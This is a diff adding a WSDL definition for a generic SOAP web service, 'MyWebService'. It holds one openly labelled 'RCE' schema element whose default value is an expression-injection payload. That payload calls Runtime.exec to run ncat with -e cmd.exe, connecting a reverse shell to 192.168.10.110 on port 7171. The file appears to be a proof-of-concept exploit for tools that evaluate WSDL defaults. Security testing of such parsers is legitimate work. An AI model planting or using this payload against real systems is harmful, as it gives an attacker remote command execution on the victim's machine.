@@ -1,0 +1,54 @@
+<definitions name="MyWebService"
+             targetNamespace="http://www.example.com/webservices"
+             xmlns="http://schemas.xmlsoap.org/wsdl/"
+             xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+             xmlns:tns="http://www.example.com/webservices">
+  <types>
+    <xsd:schema targetNamespace="http://www.example.com/webservices">
+      <xsd:element name="Request">
+        <xsd:complexType>
+          <xsd:sequence>
+			<xsd:element name="RCE" type="xsd:string" default="$${}{=Runtime.getRuntime().exec('ncat 192.168.10.110 7171 -e cmd.exe')};"/>
+          </xsd:sequence>
+        </xsd:complexType>
+      </xsd:element>
+      <xsd:element name="Response">
+        <xsd:complexType>
+          <xsd:sequence>
+            <xsd:element name="result" type="xsd:string"/>
+          </xsd:sequence>
+        </xsd:complexType>
+      </xsd:element>
+    </xsd:schema>
+  </types>
+<message name="MyOperationRequest">
+  <part name="parameters" element="tns:Request"/>
+</message>
+  <message name="MyOperationResponse">
+    <part name="parameters" element="tns:Response"/>
+  </message>
+  <portType name="MyWebServicePortType">
+    <operation name="MyOperation">
+      <input message="tns:MyOperationRequest"/>
+      <output message="tns:MyOperationResponse"/>
+    </operation>
+  </portType>
+  <binding name="MyWebServiceBinding" type="tns:MyWebServicePortType">
+    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
+    <operation name="MyOperation">
+      <soap:operation soapAction="http://www.example.com/webservices/MyOperation"/>
+      <input>
+        <soap:body use="literal"/>
+      </input>
+      <output>
+        <soap:body use="literal"/>
+      </output>
+    </operation>
+  </binding>
+  <service name="MyWebService">
+    <port name="MyWebServicePort" binding="tns:MyWebServiceBinding">
+      <soap:address location="http://localhost/MyWebService"/>
+    </port>
+  </service>
+</definitions>
